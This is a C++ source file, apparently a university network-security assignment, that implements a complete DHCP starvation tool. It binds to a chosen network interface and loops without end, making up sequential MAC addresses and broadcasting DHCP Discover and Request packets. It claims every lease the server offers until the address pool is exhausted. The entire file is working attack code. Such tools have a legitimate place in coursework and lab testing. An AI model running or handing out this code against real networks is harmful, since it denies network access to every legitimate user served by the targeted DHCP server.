/**
 *	Program: PDS - DHCP Starvation
 *	@author: Adam Bezak xbezak01
 */

#include "pds-dhcpstarve.h"

volatile sig_atomic_t flag = 0;

int main(int argc, char **argv) {
  
  	int ch;
 	bool isInterface = false;
 	string interface;

 	/* Kontrola argumentov */
	while ((ch = getopt(argc, argv, "i:")) != -1) {
		switch (ch) {
			case 'i' :
				interface = optarg;
				isInterface = true;
				break;
			default :
				print_error(ERR_BADPARAMS);
				exit(ERR_BADPARAMS);
				break;
		}
	}

	if (isInterface == false) {
		print_error(ERR_BADPARAMS);
		exit(ERR_BADPARAMS);		
	}
	

	/* Odchytenie SIG INT signalu */
	struct sigaction sigIntHandler;

	sigIntHandler.sa_handler = sigCatch;
	sigemptyset(&sigIntHandler.sa_mask);
	sigIntHandler.sa_flags = 0;

	sigaction(SIGINT, &sigIntHandler, NULL);


	/* Pociatocna random mac adresa */
	uint8_t mac[6];
	mac[0] = 0x08;
	mac[1] = 0x00;
	mac[2] = 0x27;
	mac[3] = 0x00;
	mac[4] = 0x00;
	mac[5] = 0x00;

	/* Pociatocny random transaction id */
	uint32_t xid = htonl(0x01010000);


	int socket;
	configureSocket(&socket, interface);

	Dhcp dhcpDiscover;
	Dhcp dhcpOffer;
	Dhcp dhcpRequest;
	Dhcp dhcpAck;

    while(1) {
		memset(&dhcpDiscover,0, sizeof(dhcpDiscover));
		memset(&dhcpOffer,0, sizeof(dhcpOffer));
		memset(&dhcpRequest,0, sizeof(dhcpRequest));
		memset(&dhcpAck,0, sizeof(dhcpAck));

		getMacAddress(mac, &xid);

#ifdef DEBUG
		// std::cout << std::setfill('0') << std::setw(8) << std::hex << xid << '\n';
		cout << "mac:";
		 int i;
	    for (i = 0; i < 6; ++i)
	      printf(" %02x", (unsigned char) mac[i]);
	    puts("\n");
#endif

	    makeDiscover(&dhcpDiscover, mac, &xid);

	    int sendDiscoverAndReceiveOfferResult = sendDiscoverAndReceiveOffer(&dhcpDiscover, &dhcpOffer, &socket);

	    if (sendDiscoverAndReceiveOfferResult == SIG_INT) {
	    	return NO_ERR;
	    } else if (sendDiscoverAndReceiveOfferResult != NO_ERR) {
			print_error(sendDiscoverAndReceiveOfferResult);
			if ((close(socket)) == -1) {
				print_error(SOCKET_ERR);
				return (SOCKET_ERR);				
			}
			return sendDiscoverAndReceiveOfferResult;
	    }
	  
	    uint8_t dhcpServerId[4];
	    memcpy(&dhcpServerId, &dhcpOffer.siaddr, 4);

	    uint32_t offeredIp;
	    memcpy(&offeredIp, &dhcpOffer.yiaddr, sizeof(uint32_t));

#ifdef DEBUG
	    printf("%s", inet_ntoa(*(struct in_addr *)&offeredIp));
#endif

	    makeRequest(&dhcpRequest, mac, dhcpServerId, &xid, &offeredIp);
	    int sendRequestAndReceiveAckResult = sendRequestAndReceiveAck(&dhcpRequest, &dhcpAck, &socket);

	    if (sendRequestAndReceiveAckResult == SIG_INT) {
	    	return NO_ERR;
	    } else if (sendRequestAndReceiveAckResult != NO_ERR) {
			print_error(sendRequestAndReceiveAckResult);
			if ((close(socket)) == -1) {
				print_error(SOCKET_ERR);
				return (SOCKET_ERR);				
			}
			return sendRequestAndReceiveAckResult;	    	
	    }

	    printf("\n DHCP ACK received \n");
    }

    if ((close(socket)) == -1)      // close the socket
	err(1,"close() failed");

    return 0;
}

void configureSocket(int *sock, string interface) {
	struct sockaddr_in   addrIn;   // Datova struktura adries
	int on = 1; // socket option

	memset(&addrIn,0,sizeof(addrIn));
	addrIn.sin_family=AF_INET;
	addrIn.sin_addr.s_addr=inet_addr("0.0.0.0");
	addrIn.sin_port=htons(68);

	/* Vytvorenie socketu */
	if ((*sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	err(1,"socket failed()");

	/* Povolenie reusovania lokalnych adries na porte */
	if ((setsockopt(*sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on))) == -1)
	err(1,"setsockopt failead()");

	/* Povolenie odosielania broadcastu socketom */
	if ((setsockopt(*sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))) == -1)
	err(1,"setsockopt failebd()");

	/* Povolenie pozuivat viacero portov na jednom sockete */
	if ((setsockopt(*sock, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on))) == -1)
	err(1,"setsockopt failecd()");

	/* Nabinovanie socketu na rozhranie */
	if ((setsockopt(*sock, SOL_SOCKET, SO_BINDTODEVICE, interface.c_str(), interface.length())) == -1)
	err(1,"setsockopt failedd()");

	if ((::bind(*sock, (struct sockaddr *) &addrIn, sizeof(addrIn))) < 0) {
		if ((close(*sock)) == -1)      // close the socket
		err(1,"close() failed");
		err(1,"fail");
	}
}

void makeDiscover(Dhcp *dhcpDiscover, uint8_t mac[], uint32_t *xid) {
    dhcpDiscover->opcode = 1;
    dhcpDiscover->htype = 1;
    dhcpDiscover->hlen = 6;
    dhcpDiscover->hops = 0;
    dhcpDiscover->xid = *xid;
    dhcpDiscover->secs = 0;
    dhcpDiscover->flags = htons(0x8000);
    dhcpDiscover->ciaddr = 0;
    dhcpDiscover->yiaddr = 0;
    dhcpDiscover->siaddr = 0;
    dhcpDiscover->giaddr = 0;
    memcpy(dhcpDiscover->chaddr, mac, DHCP_CHADDR_LEN);

    dhcpDiscover->magic_cookie = htonl(0x63825363);
   	
   	uint8_t option = DHCP_OPTION_DISCOVER;
   	fillDhcpOptions(&dhcpDiscover->bp_options[0], MESSAGE_TYPE_DHCP, &option, sizeof(option));

   	uint32_t req_ip = htonl(0xc0a8010a);
   	fillDhcpOptions(&dhcpDiscover->bp_options[3], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&req_ip, sizeof(req_ip));

   	uint8_t parameter_req_list[] = {MESSAGE_TYPE_REQ_SUBNET_MASK, MESSAGE_TYPE_ROUTER, MESSAGE_TYPE_DOMAIN_NAME, MESSAGE_TYPE_DNS};
   	fillDhcpOptions(&dhcpDiscover->bp_options[9], MESSAGE_TYPE_PARAMETER_REQ_LIST, (u_int8_t *)&parameter_req_list, sizeof(parameter_req_list));

   	option = 0;
   	fillDhcpOptions(&dhcpDiscover->bp_options[15], MESSAGE_TYPE_END, &option, 0);
}

int sendDiscoverAndReceiveOffer(Dhcp *dhcpDiscover, Dhcp *dhcpOffer, int *socket) {
	struct sockaddr_in   addrIn, addrOut;
	socklen_t addrlen = sizeof(addrIn);

	memset(&addrIn,0,sizeof(addrIn));
	addrIn.sin_family=AF_INET;
	addrIn.sin_addr.s_addr=inet_addr("0.0.0.0");
	addrIn.sin_port=htons(68);

	memset(&addrOut,0,sizeof(addrOut));
	addrOut.sin_family=AF_INET;
	addrOut.sin_addr.s_addr=inet_addr("255.255.255.255");
	addrOut.sin_port=htons(67);

	/* Odoslanie struktury na dany socket */
	if (sendto(*socket, dhcpDiscover, sizeof(*dhcpDiscover),0, (struct sockaddr *) &addrOut, sizeof(addrOut)) < 0)
		err(1,"sendto");

	printf("\n DHCP Discover sent \n");

	while(1) {
		/* Citanie dat zo socketu */
		if (recvfrom(*socket, dhcpOffer, sizeof(*dhcpOffer), 0, (struct sockaddr *) &addrIn, &addrlen) < 0) {
			if (flag == 1)
				return SIG_INT;
			return RECV_ERR;
		}

		if (dhcpOffer->bp_options[2] == (uint8_t)DHCP_OPTION_OFFER) {
	#ifdef DEBUG
			printf("DHCP OFFER received\n");
	    	printf("%s\n", inet_ntoa(*(struct in_addr *)&dhcpOffer->yiaddr));
	#endif
			return NO_ERR;
		}
	}

	return OTHER_ERR;
}

void makeRequest(Dhcp *dhcpRequest, uint8_t mac[], uint8_t dhcpServerId[], uint32_t *xid, uint32_t *offeredIp) {
    dhcpRequest->opcode = 1;
    dhcpRequest->htype = 1;
    dhcpRequest->hlen = 6;
    dhcpRequest->hops = 0;
    dhcpRequest->xid = *xid;
    dhcpRequest->secs = 0;
    dhcpRequest->flags = htons(0x8000);
    dhcpRequest->ciaddr = 0;
    dhcpRequest->yiaddr = *offeredIp;
    memcpy(&dhcpRequest->siaddr, dhcpServerId, sizeof(uint32_t));
    dhcpRequest->giaddr = 0;

    memcpy(dhcpRequest->chaddr, mac, DHCP_CHADDR_LEN);
    dhcpRequest->magic_cookie = htonl(0x63825363);

   	printf(" Offered ip: %s\n", inet_ntoa(*(struct in_addr *)offeredIp));

   	uint8_t option = DHCP_OPTION_REQUEST;
   	fillDhcpOptions(&dhcpRequest->bp_options[0], MESSAGE_TYPE_DHCP, &option, sizeof(option));
   	fillDhcpOptions(&dhcpRequest->bp_options[3], MESSAGE_TYPE_REQ_IP, (u_int8_t *)offeredIp, sizeof(uint32_t));

   	dhcpRequest->bp_options[9] = 0x36;
   	dhcpRequest->bp_options[10] = 0x4;
   	memcpy(&dhcpRequest->bp_options[11], dhcpServerId, sizeof(uint32_t));
	
	option = 0;
   	fillDhcpOptions(&dhcpRequest->bp_options[19], MESSAGE_TYPE_END, &option, 0);
}

int sendRequestAndReceiveAck(Dhcp *dhcpRequest, Dhcp *dhcpAck, int *socket) {
	struct sockaddr_in   addrIn, addrOut;
	socklen_t addrlen = sizeof(addrIn);

	memset(&addrIn,0,sizeof(addrIn));
	addrIn.sin_family=AF_INET;
	addrIn.sin_addr.s_addr=inet_addr("0.0.0.0");
	addrIn.sin_port=htons(68);

	memset(&addrOut,0,sizeof(addrOut));
	addrOut.sin_family=AF_INET;
	addrOut.sin_addr.s_addr=inet_addr("255.255.255.255");
	addrOut.sin_port=htons(67);

	printf("\n DHCP Request sent \n");

	while(1) {
		/* Odoslanie struktury na dany socket */
		if (sendto(*socket, dhcpRequest, sizeof(*dhcpRequest),0, (struct sockaddr *) &addrOut, sizeof(addrOut)) < 0)
			err(1,"sendto");

		/* Citanie dat zo socketu */
		if (recvfrom(*socket, dhcpAck, sizeof(*dhcpAck), 0, (struct sockaddr *) &addrIn, &addrlen) < 0) {
			if (flag == 1)
				return SIG_INT;
			return RECV_ERR;
		}
		if (dhcpAck->bp_options[2] == (uint8_t)DHCP_OPTION_ACK) {
			return NO_ERR;
		}
	}

	return OTHER_ERR;
}

void fillDhcpOptions(uint8_t *packetOptionPart, uint8_t code, uint8_t *data, u_int8_t len) {
    packetOptionPart[0] = code;
    packetOptionPart[1] = len;
    memcpy(&packetOptionPart[2], data, len);
}

void getMacAddress(uint8_t mac[], uint32_t *xid) {

	/* Generovanie novej MAC adresy */
	if (mac[5] < (uint8_t)0xFF) {
		mac[5] = mac[5] + 1;
	} else if (mac[4] < (uint8_t)0xFF) {
		mac[4] = mac[4] + 1;
	} else if (mac[3] < (uint8_t)0xFF) {
		mac[3] = mac[3] + 1;
	}

	/* Inkement transaction id */
	*xid = *xid + 1;
}

void sigCatch(int sig) {
	flag = 1;
}

void print_error(int err) {
	cerr << errors[err] << endl;
}